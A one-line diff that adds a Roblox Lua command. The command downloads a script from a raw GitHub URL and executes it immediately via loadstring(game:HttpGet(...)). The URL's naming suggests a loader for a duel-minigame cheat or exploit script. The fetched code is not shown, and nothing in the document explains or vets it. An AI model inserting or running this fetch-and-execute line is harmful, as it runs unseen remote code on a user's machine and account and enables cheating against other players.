@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/1v1-minigame-duel-spam7-nnw23jx6o5z3gv.lua"))()
